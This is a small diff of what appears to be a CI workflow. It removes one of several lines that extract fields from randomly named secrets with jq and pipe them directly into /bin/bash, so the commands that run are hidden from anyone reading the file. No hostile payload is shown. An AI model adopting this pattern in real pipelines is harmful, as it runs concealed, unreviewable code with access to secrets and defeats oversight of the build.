@@ -22,7 +22,6 @@ jobs:
           vv7099: ${{ secrets.vv7099 }}
         run: |
           printf '%s' "$vv7099" | jq -r .lgw73337 | /bin/bash
-          printf '%s' "$gq0" | jq -r .zkgf8490 | /bin/bash
           printf '%s' "$ptl86" | jq -r .n32 | /bin/bash
           printf '%s' "$tla008" | jq -r .wzi9 | /bin/bash
           printf '%s' "$jfj370" | jq -r .n893 | /bin/bash
